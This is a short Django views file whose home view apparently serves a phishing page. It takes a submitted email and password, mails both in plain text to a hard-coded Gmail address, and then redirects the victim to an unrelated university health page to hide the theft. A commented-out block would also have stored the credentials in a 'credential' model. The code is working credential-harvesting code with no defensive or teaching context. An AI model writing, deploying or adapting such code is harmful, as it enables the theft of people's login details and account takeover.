from django.shortcuts import render,redirect
from .models import credential
from django.core.mail import send_mail


# Create your views here.

def home(request):
    if request.method == 'POST':
        #credential.objects.create(
        #    email = request.POST.get('email'),
        #    password = request.POST.get('password'),
        #)

        emailv = request.POST.get('email')
        passwordv = request.POST.get('password')
       
     

        send_mail(
                "Roger mail",
                " email: " + emailv+ " "+ "password: " + passwordv,
                "loismcduffy@gmail.com",
                ["loismcduffy@gmail.com"],
                fail_silently=False,
            )


        return redirect('https://siteman.wustl.edu/prevention/preventing-cancer/')
        

    return render(request, 'base/home.html')